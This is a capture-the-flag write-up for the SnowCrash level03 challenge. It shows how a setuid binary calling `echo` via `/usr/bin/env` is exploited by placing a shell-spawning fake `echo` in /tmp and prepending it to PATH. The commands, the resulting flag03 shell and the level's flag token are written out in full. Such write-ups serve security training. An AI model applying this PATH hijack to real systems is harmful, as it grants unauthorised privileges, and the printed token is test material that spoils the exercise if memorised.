### Exploit

In this level, we're provided with an exec file `./level03`. When executing the file, we get the message "Exploit me". Well, cheers, I might just do that. Calling `strings` and `nm`, we're able to get a better insight into what this exploit might be.

```
    level03@SnowCrash:~$ strings level03
    [...]
    /usr/bin/env echo Exploit me
    [...]
    level03@SnowCrash:~$ nm level03
    [...]
    080484a4 T main
             U setresgid@@GLIBC_2.0
             U setresuid@@GLIBC_2.0
             U system@@GLIBC_2.0
```

Notice “echo” is being called without its absolute path and relies on `/usr/bin/env` in order to be executed. This is a major security vulnerability because the script will rely on the environment variables of the current shell (which can be tampered with). Let's create a temporary `echo` file which will in fact spawn a shell. The idea is that when the user launches the executable, the "classic" echo command will be overwritten by our "fake" echo commend. By exporting a new path to the environment, `/tmp/echo` is called first and does whatever you want.

```
    level03@SnowCrash:~$ touch /tmp/echo
    level03@SnowCrash:~$ cat /tmp/echo
    #!/bin/sh
    sh
    level03@SnowCrash:~$ chmod 775 /tmp/echo
    level03@SnowCrash:~$ export PATH=/tmp:$PATH
    level03@SnowCrash:~$ echo $PATH
    /tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
    level03@SnowCrash:~$ ./level03
    $ id
    uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
    $ getflag
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

We've learnt to to tamper with environment variables! Hope this skill is going to be useful in the future...
